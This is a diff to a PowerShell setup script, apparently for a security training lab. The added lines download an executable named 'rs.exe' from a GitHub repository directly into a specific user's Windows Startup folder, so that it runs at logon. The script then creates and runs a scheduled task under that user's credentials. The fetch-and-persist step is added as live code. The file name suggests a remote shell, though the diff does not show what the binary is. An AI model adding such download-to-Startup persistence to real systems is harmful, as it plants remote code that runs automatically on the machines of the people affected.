@@ -1047,11 +1047,13 @@ foreach (`$user in `$users) {
     Write-Output "Profile setup complete for `$userName."
 }
 
+write-output "Force creating Startup Folder and Downloading directly to the Startup folder..."
+`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
 `$startupFolder = "C:\users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-if (!(Test-Path `$startupFolder)) {
-    New-Item -ItemType Directory -Path `$startupFolder -Force
-}
-
+New-Item -ItemType Directory -Path `$startupFolder -Force
+`$destination = `$startupFolder + "\rs.exe"
+Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination
+write-output "Done downloading!"
 
 schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
 schtasks /run /tn "RunCMD"
